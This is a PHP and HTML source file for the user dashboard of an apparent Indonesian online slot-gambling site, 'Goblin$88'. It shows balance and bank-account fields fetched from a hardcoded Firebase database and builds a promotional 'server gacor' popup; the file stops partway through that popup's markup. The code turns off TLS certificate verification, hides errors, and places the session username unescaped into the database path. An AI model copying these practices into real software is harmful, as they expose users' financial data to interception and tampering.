<?php
session_start();
error_reporting(0);

// 1. Proteksi: Jika belum login, tendang balik ke index
// Sesuaikan nama session-nya (tadi di register kita pake $_SESSION['username'])
if (!isset($_SESSION['username'])) {
    header("Location: index.php");
    exit();
}

// 2. CONFIGURATION FIREBASE (Gak butuh MySQL lagi)
define('FIREBASE_URL', 'https://firequeen-2986c-default-rtdb.asia-southeast1.firebasedatabase.app/');

function firebase_get_user($username) {
    $url = FIREBASE_URL . "users_situs1/" . $username . ".json";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result, true);
}

// 3. Ambil data user secara real-time dari Firebase
$u = $_SESSION['username'];
$row = firebase_get_user($u);

// 4. Jika data ditemukan di Firebase, tampilkan
if ($row) {
    $username_tampil = $u;
    // Ambil saldo, kalau kosong set jadi 0
    $saldo_raw = $row['saldo'] ?? 0;
    $saldo_game = number_format($saldo_raw, 2);
    
    $nama_rekening = $row['acc_name'] ?? 'Tidak Ada Nama';
    $bank_user     = $row['bank_name'] ?? '-';
    $nomer_rek     = $row['acc_no'] ?? '-';
} else {
    // Jika user tidak ditemukan di Firebase (mungkin dihapus manual di console)
    session_destroy();
    header("Location: index.php");
    exit();
}

// Ambil data Live Chat secara real-time dari Firebase
$linkLiveChat = "https://direct.lc.chat/19926541/"; // Default jika belum di-set

$url_firebase_chat = FIREBASE_URL . "settings.json";
$ch_chat = curl_init();
curl_setopt($ch_chat, CURLOPT_URL, $url_firebase_chat);
curl_setopt($ch_chat, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch_chat, CURLOPT_SSL_VERIFYPEER, false);
$result_chat = curl_exec($ch_chat);
curl_close($ch_chat);

$dataSettings = json_decode($result_chat, true);
if (!empty($dataSettings['livechat'])) {
    $valLiveChat = trim($dataSettings['livechat']);
    $linkLiveChat = (strpos($valLiveChat, 'http') === 0) ? $valLiveChat : "https://direct.lc.chat/" . $valLiveChat . "/";
}
?>
<!DOCTYPE html>
<html lang="id-ID"><head>
  <title>Goblin$88 Daftar dan Link Login Alternatif Terbaru 2025</title>
<meta name="robots" content="INDEX, FOLLOW">
<meta name="Content-Type" content="text/html">
<meta name="twitter:card" content="summary">
<meta name="og:type" content="website">
<meta name="author" content="Mercusuar77">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Goblin887777/goblin88@main/assets/promotion_banners/1.jpg">


<link rel="icon" href="https://cdn.jsdelivr.net/gh/Goblin887777/goblin88@main/assets/ImageFile/icongoblin.jpeg" type="image/gif">

<meta property="og:site_name" content="Mercusuar77">
<meta name="twitter:site" content="Mercusuar77">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Goblin887777/goblin88@main/assets/promotion_banners/1.jpg">
<meta property="og:image:alt" content="Mercusuar77">
<meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=no">

<meta property="og:url" content="https://Goblin88.site/">
<link rel="canonical" href="https://Goblin88.site/">


<script src="https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.id.JlZG7ePi4xg.O/m=gapi_iframes/rt=j/sv=1/d=1/ed=1/rs=AHpOoo9bZCvgOq1E3JiiRDLsf0QN3hR_9A/cb=gapi.loaded_0?le=scs" async=""></script><script type="module" src="https://asset.qrishoki.com/gigagaming.js" async=""></script><style>.swal2-popup.swal2-toast{flex-direction:row;align-items:center;width:auto;padding:.625em;overflow-y:hidden;background:#fff;box-shadow:0 0 .625em #d9d9d9}.swal2-popup.swal2-toast .swal2-header{flex-direction:row;padding:0}.swal2-popup.swal2-toast .swal2-title{flex-grow:1;justify-content:flex-start;margin:0 .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{position:static;width:.8em;height:.8em;line-height:.8}.swal2-popup.swal2-toast .swal2-content{justify-content:flex-start;padding:0;font-size:1em}.swal2-popup.swal2-toast .swal2-icon{width:2em;min-width:2em;height:2em;margin:0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:700}@media all and (-ms-high-contrast:none),(-ms-high-contrast:active){.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{font-size:.25em}}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{flex-basis:auto!important;width:auto;height:auto;margin:0 .3125em}.swal2-popup.swal2-toast .swal2-styled{margin:0 .3125em;padding:.3125em .625em;font-size:1em}.swal2-popup.swal2-toast .swal2-styled:focus{box-shadow:0 0 0 1px #fff,0 0 0 3px rgba(50,100,150,.4)}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;transform:rotate(45deg);border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-.8em;left:-.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{-webkit-animation:swal2-toast-animate-success-line-tip .75s;animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{-webkit-animation:swal2-toast-animate-success-line-long .75s;animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{-webkit-animation:swal2-toast-show .5s;animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{-webkit-animation:swal2-toast-hide .1s forwards;animation:swal2-toast-hide .1s forwards}.swal2-container{display:flex;position:fixed;z-index:1060;top:0;right:0;bottom:0;left:0;flex-direction:row;align-items:center;justify-content:center;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}.swal2-container.swal2-backdrop-show,.swal2-container.swal2-noanimation{background:rgba(0,0,0,.4)}.swal2-container.swal2-backdrop-hide{background:0 0!important}.swal2-container.swal2-top{align-items:flex-start}.swal2-container.swal2-top-left,.swal2-container.swal2-top-start{align-items:flex-start;justify-content:flex-start}.swal2-container.swal2-top-end,.swal2-container.swal2-top-right{align-items:flex-start;justify-content:flex-end}.swal2-container.swal2-center{align-items:center}.swal2-container.swal2-center-left,.swal2-container.swal2-center-start{align-items:center;justify-content:flex-start}.swal2-container.swal2-center-end,.swal2-container.swal2-center-right{align-items:center;justify-content:flex-end}.swal2-container.swal2-bottom{align-items:flex-end}.swal2-container.swal2-bottom-left,.swal2-container.swal2-bottom-start{align-items:flex-end;justify-content:flex-start}.swal2-container.swal2-bottom-end,.swal2-container.swal2-bottom-right{align-items:flex-end;justify-content:flex-end}.swal2-container.swal2-bottom-end>:first-child,.swal2-container.swal2-bottom-left>:first-child,.swal2-container.swal2-bottom-right>:first-child,.swal2-container.swal2-bottom-start>:first-child,.swal2-container.swal2-bottom>:first-child{margin-top:auto}.swal2-container.swal2-grow-fullscreen>.swal2-modal{display:flex!important;flex:1;align-self:stretch;justify-content:center}.swal2-container.swal2-grow-row>.swal2-modal{display:flex!important;flex:1;align-content:center;justify-content:center}.swal2-container.swal2-grow-column{flex:1;flex-direction:column}.swal2-container.swal2-grow-column.swal2-bottom,.swal2-container.swal2-grow-column.swal2-center,.swal2-container.swal2-grow-column.swal2-top{align-items:center}.swal2-container.swal2-grow-column.swal2-bottom-left,.swal2-container.swal2-grow-column.swal2-bottom-start,.swal2-container.swal2-grow-column.swal2-center-left,.swal2-container.swal2-grow-column.swal2-center-start,.swal2-container.swal2-grow-column.swal2-top-left,.swal2-container.swal2-grow-column.swal2-top-start{align-items:flex-start}.swal2-container.swal2-grow-column.swal2-bottom-end,.swal2-container.swal2-grow-column.swal2-bottom-right,.swal2-container.swal2-grow-column.swal2-center-end,.swal2-container.swal2-grow-column.swal2-center-right,.swal2-container.swal2-grow-column.swal2-top-end,.swal2-container.swal2-grow-column.swal2-top-right{align-items:flex-end}.swal2-container.swal2-grow-column>.swal2-modal{display:flex!important;flex:1;align-content:center;justify-content:center}.swal2-container.swal2-no-transition{transition:none!important}.swal2-container:not(.swal2-top):not(.swal2-top-start):not(.swal2-top-end):not(.swal2-top-left):not(.swal2-top-right):not(.swal2-center-start):not(.swal2-center-end):not(.swal2-center-left):not(.swal2-center-right):not(.swal2-bottom):not(.swal2-bottom-start):not(.swal2-bottom-end):not(.swal2-bottom-left):not(.swal2-bottom-right):not(.swal2-grow-fullscreen)>.swal2-modal{margin:auto}@media all and (-ms-high-contrast:none),(-ms-high-contrast:active){.swal2-container .swal2-modal{margin:0!important}}.swal2-popup{display:none;position:relative;box-sizing:border-box;flex-direction:column;justify-content:center;width:32em;max-width:100%;padding:1.25em;border:none;border-radius:.3125em;background:#fff;font-family:inherit;font-size:1rem}.swal2-popup:focus{outline:0}.swal2-popup.swal2-loading{overflow-y:hidden}.swal2-header{display:flex;flex-direction:column;align-items:center;padding:0 1.8em}.swal2-title{position:relative;max-width:100%;margin:0 0 .4em;padding:0;color:#595959;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}.swal2-actions{display:flex;z-index:1;flex-wrap:wrap;align-items:center;justify-content:center;width:100%;margin:1.25em auto 0}.swal2-actions:not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}.swal2-actions:not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0,0,0,.1),rgba(0,0,0,.1))}.swal2-actions:not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0,0,0,.2),rgba(0,0,0,.2))}.swal2-actions.swal2-loading .swal2-styled.swal2-confirm{box-sizing:border-box;width:2.5em;height:2.5em;margin:.46875em;padding:0;-webkit-animation:swal2-rotate-loading 1.5s linear 0s infinite normal;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border:.25em solid transparent;border-radius:100%;border-color:transparent;background-color:transparent!important;color:transparent!important;cursor:default;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.swal2-actions.swal2-loading .swal2-styled.swal2-cancel{margin-right:30px;margin-left:30px}.swal2-actions.swal2-loading :not(.swal2-styled).swal2-confirm::after{content:"";display:inline-block;width:15px;height:15px;margin-left:5px;-webkit-animation:swal2-rotate-loading 1.5s linear 0s infinite normal;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border:3px solid #999;border-radius:50%;border-right-color:transparent;box-shadow:1px 1px 1px #fff}.swal2-styled{margin:.3125em;padding:.625em 2em;box-shadow:none;font-weight:500}.swal2-styled:not([disabled]){cursor:pointer}.swal2-styled.swal2-confirm{border:0;border-radius:.25em;background:initial;background-color:#3085d6;color:#fff;font-size:1.0625em}.swal2-styled.swal2-cancel{border:0;border-radius:.25em;background:initial;background-color:#aaa;color:#fff;font-size:1.0625em}.swal2-styled:focus{outline:0;box-shadow:0 0 0 1px #fff,0 0 0 3px rgba(50,100,150,.4)}.swal2-styled::-moz-focus-inner{border:0}.swal2-footer{justify-content:center;margin:1.25em 0 0;padding:1em 0 0;border-top:1px solid #eee;color:#545454;font-size:1em}.swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;height:.25em;overflow:hidden;border-bottom-right-radius:.3125em;border-bottom-left-radius:.3125em}.swal2-timer-progress-bar{width:100%;height:.25em;background:rgba(0,0,0,.2)}.swal2-image{max-width:100%;margin:1.25em auto}.swal2-close{position:absolute;z-index:2;top:0;right:0;align-items:center;justify-content:center;width:1.2em;height:1.2em;padding:0;overflow:hidden;transition:color .1s ease-out;border:none;border-radius:0;background:0 0;color:#ccc;font-family:serif;font-size:2.5em;line-height:1.2;cursor:pointer}.swal2-close:hover{transform:none;background:0 0;color:#f27474}.swal2-close::-moz-focus-inner{border:0}.swal2-content{z-index:1;justify-content:center;margin:0;padding:0 1.6em;color:#545454;font-size:1.125em;font-weight:400;line-height:normal;text-align:center;word-wrap:break-word}.swal2-checkbox,.swal2-file,.swal2-input,.swal2-radio,.swal2-select,.swal2-textarea{margin:1em auto}.swal2-file,.swal2-input,.swal2-textarea{box-sizing:border-box;width:100%;transition:border-color .3s,box-shadow .3s;border:1px solid #d9d9d9;border-radius:.1875em;background:inherit;box-shadow:inset 0 1px 1px rgba(0,0,0,.06);color:inherit;font-size:1.125em}.swal2-file.swal2-inputerror,.swal2-input.swal2-inputerror,.swal2-textarea.swal2-inputerror{border-color:#f27474!important;box-shadow:0 0 2px #f27474!important}.swal2-file:focus,.swal2-input:focus,.swal2-textarea:focus{border:1px solid #b4dbed;outline:0;box-shadow:0 0 3px #c4e6f5}.swal2-file::-moz-placeholder,.swal2-input::-moz-placeholder,.swal2-textarea::-moz-placeholder{color:#ccc}.swal2-file:-ms-input-placeholder,.swal2-input:-ms-input-placeholder,.swal2-textarea:-ms-input-placeholder{color:#ccc}.swal2-file::-ms-input-placeholder,.swal2-input::-ms-input-placeholder,.swal2-textarea::-ms-input-placeholder{color:#ccc}.swal2-file::placeholder,.swal2-input::placeholder,.swal2-textarea::placeholder{color:#ccc}.swal2-range{margin:1em auto;background:#fff}.swal2-range input{width:80%}.swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}.swal2-range input,.swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}.swal2-input{height:2.625em;padding:0 .75em}.swal2-input[type=number]{max-width:10em}.swal2-file{background:inherit;font-size:1.125em}.swal2-textarea{height:6.75em;padding:.75em}.swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:inherit;color:inherit;font-size:1.125em}.swal2-checkbox,.swal2-radio{align-items:center;justify-content:center;background:#fff;color:inherit}.swal2-checkbox label,.swal2-radio label{margin:0 .6em;font-size:1.125em}.swal2-checkbox input,.swal2-radio input{margin:0 .4em}.swal2-validation-message{display:none;align-items:center;justify-content:center;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}.swal2-validation-message::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}.swal2-icon{position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:1.25em auto 1.875em;border:.25em solid transparent;border-radius:50%;font-family:inherit;line-height:5em;cursor:default;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}.swal2-icon.swal2-error{border-color:#f27474;color:#f27474}.swal2-icon.swal2-error .swal2-x-mark{position:relative;flex-grow:1}.swal2-icon.swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}.swal2-icon.swal2-error.swal2-icon-show{-webkit-animation:swal2-animate-error-icon .5s;animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark{-webkit-animation:swal2-animate-error-x-mark .5s;animation:swal2-animate-error-x-mark .5s}.swal2-icon.swal2-warning{border-color:#facea8;color:#f8bb86}.swal2-icon.swal2-info{border-color:#9de0f6;color:#3fc3ee}.swal2-icon.swal2-question{border-color:#c9dae1;color:#87adbd}.swal2-icon.swal2-success{border-color:#a5dc86;color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;transform:rotate(45deg);border-radius:50%}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left]{top:-.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right]{top:-.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}.swal2-icon.swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-.25em;left:-.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}.swal2-icon.swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}.swal2-icon.swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}.swal2-icon.swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip{-webkit-animation:swal2-animate-success-line-tip .75s;animation:swal2-animate-success-line-tip .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long{-webkit-animation:swal2-animate-success-line-long .75s;animation:swal2-animate-success-line-long .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right{-webkit-animation:swal2-rotate-success-circular-line 4.25s ease-in;animation:swal2-rotate-success-circular-line 4.25s ease-in}.swal2-progress-steps{align-items:center;margin:0 0 1.25em;padding:0;background:inherit;font-weight:600}.swal2-progress-steps li{display:inline-block;position:relative}.swal2-progress-steps .swal2-progress-step{z-index:20;width:2em;height:2em;border-radius:2em;background:#3085d6;color:#fff;line-height:2em;text-align:center}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#3085d6}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}.swal2-progress-steps .swal2-progress-step-line{z-index:10;width:2.5em;height:.4em;margin:0 -1px;background:#3085d6}[class^=swal2]{-webkit-tap-highlight-color:transparent}.swal2-show{-webkit-animation:swal2-show .3s;animation:swal2-show .3s}.swal2-hide{-webkit-animation:swal2-hide .15s forwards;animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{right:auto;left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@supports (-ms-accelerator:true){.swal2-range input{width:100%!important}.swal2-range output{display:none}}@media all and (-ms-high-contrast:none),(-ms-high-contrast:active){.swal2-range input{width:100%!important}.swal2-range output{display:none}}@-moz-document url-prefix(){.swal2-close:focus{outline:2px solid rgba(50,100,150,.4)}}@-webkit-keyframes swal2-toast-show{0%{transform:translateY(-.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0)}}@keyframes swal2-toast-show{0%{transform:translateY(-.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0)}}@-webkit-keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@-webkit-keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@-webkit-keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@-webkit-keyframes swal2-show{0%{transform:scale(.7)}45%{transform:scale(1.05)}80%{transform:scale(.95)}100%{transform:scale(1)}}@keyframes swal2-show{0%{transform:scale(.7)}45%{transform:scale(1.05)}80%{transform:scale(.95)}100%{transform:scale(1)}}@-webkit-keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(.5);opacity:0}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(.5);opacity:0}}@-webkit-keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@-webkit-keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@-webkit-keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@-webkit-keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(.4);opacity:0}50%{margin-top:1.625em;transform:scale(.4);opacity:0}80%{margin-top:-.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(.4);opacity:0}50%{margin-top:1.625em;transform:scale(.4);opacity:0}80%{margin-top:-.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@-webkit-keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0);opacity:1}}@-webkit-keyframes swal2-rotate-loading{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}@keyframes swal2-rotate-loading{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto!important}body.swal2-no-backdrop .swal2-container{top:auto;right:auto;bottom:auto;left:auto;max-width:calc(100% - .625em * 2);background-color:transparent!important}body.swal2-no-backdrop .swal2-container>.swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}body.swal2-no-backdrop .swal2-container.swal2-top{top:0;left:50%;transform:translateX(-50%)}body.swal2-no-backdrop .swal2-container.swal2-top-left,body.swal2-no-backdrop .swal2-container.swal2-top-start{top:0;left:0}body.swal2-no-backdrop .swal2-container.swal2-top-end,body.swal2-no-backdrop .swal2-container.swal2-top-right{top:0;right:0}body.swal2-no-backdrop .swal2-container.swal2-center{top:50%;left:50%;transform:translate(-50%,-50%)}body.swal2-no-backdrop .swal2-container.swal2-center-left,body.swal2-no-backdrop .swal2-container.swal2-center-start{top:50%;left:0;transform:translateY(-50%)}body.swal2-no-backdrop .swal2-container.swal2-center-end,body.swal2-no-backdrop .swal2-container.swal2-center-right{top:50%;right:0;transform:translateY(-50%)}body.swal2-no-backdrop .swal2-container.swal2-bottom{bottom:0;left:50%;transform:translateX(-50%)}body.swal2-no-backdrop .swal2-container.swal2-bottom-left,body.swal2-no-backdrop .swal2-container.swal2-bottom-start{bottom:0;left:0}body.swal2-no-backdrop .swal2-container.swal2-bottom-end,body.swal2-no-backdrop .swal2-container.swal2-bottom-right{right:0;bottom:0}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll!important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static!important}}body.swal2-toast-shown .swal2-container{background-color:transparent}body.swal2-toast-shown .swal2-container.swal2-top{top:0;right:auto;bottom:auto;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{top:0;right:0;bottom:auto;left:auto}body.swal2-toast-shown .swal2-container.swal2-top-left,body.swal2-toast-shown .swal2-container.swal2-top-start{top:0;right:auto;bottom:auto;left:0}body.swal2-toast-shown .swal2-container.swal2-center-left,body.swal2-toast-shown .swal2-container.swal2-center-start{top:50%;right:auto;bottom:auto;left:0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{top:50%;right:auto;bottom:auto;left:50%;transform:translate(-50%,-50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{top:50%;right:0;bottom:auto;left:auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-left,body.swal2-toast-shown .swal2-container.swal2-bottom-start{top:auto;right:auto;bottom:0;left:0}body.swal2-toast-shown .swal2-container.swal2-bottom{top:auto;right:auto;bottom:0;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{top:auto;right:0;bottom:0;left:auto}body.swal2-toast-column .swal2-toast{flex-direction:column;align-items:stretch}body.swal2-toast-column .swal2-toast .swal2-actions{flex:1;align-self:stretch;height:2.2em;margin-top:.3125em}body.swal2-toast-column .swal2-toast .swal2-loading{justify-content:center}body.swal2-toast-column .swal2-toast .swal2-input{height:2em;margin:.3125em auto;font-size:1em}body.swal2-toast-column .swal2-toast .swal2-validation-message{font-size:1em}</style><script src="https://apis.google.com/js/api.js?onload=__iframefcb624326" type="text/javascript" charset="UTF-8" gapi_processed="true"></script></head><body class="mobile"><div style="position: fixed; bottom: 120px; left: 10px; z-index: 10; opacity: 0.98;">
<a href="https://l1nk.dev/wababyboss" target="_blank" rel="nofollow"><img src="/assets/media.tenor.com/Spdlu7aT88AAAAAj/wp.gif" style="object-fit:cover;" width="40" height="40" border="0" alt="WA Mercusuar77"></a></div> 
<script>
    window.addEventListener("load", function () {
      const banner = document.getElementById("carousel-fixed-height");
      if (!banner || document.getElementById("maxwin-overlay")) return;
    
      const btnWrapper = document.createElement("div");
      btnWrapper.style.textAlign = "center";
      btnWrapper.style.margin = "20px";
      btnWrapper.innerHTML = `
        <button id="btnOpenMaxwin" style="
          background: linear-gradient(to bottom, #FFD700, #B7870C);
          color: #111;
          border: none;
          padding: 12px 30px;
          border-radius: 6px;
          font-size: 16px;
          font-weight: bold;
          box-shadow: 0 4px 8px rgba(255,215,0,0.5);
          cursor: pointer;
        ">🌐 PILIH SERVER GACOR</button>
      `;
      banner.parentNode.insertBefore(btnWrapper, banner.nextSibling);
    
      const popup = document.createElement("div");
      popup.id = "maxwin-overlay";
      popup.style.cssText = `
        position: fixed;
        top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(0,0,0,0.85);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 99999;
      `;
      popup.innerHTML = `
        <div id="maxwin-modal" style="
          background: #1c1c1c;
          border: 2px solid #FFD700;
          border-radius: 10px;
          max-width: 800px;
          width: 90%;
          padding: 25px;
          position: relative;
          color: #fff;
          font-family: Arial, sans-serif;
          box-shadow: 0 0 20px rgba(255,215,0,0.3);
        ">
          <button id="closeMaxwin" style="
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 24px;
            color: #FFD700;
            cursor: pointer;
            border: none;
            background: transparent;
          ">&times;</button>
    
          <h4 style="font-size: 14px; color:#FFD700;">FITUR EKSKLUSIF SERVER INTERNATIONAL</h4>
          <hr style="border: 1px solid #333;">
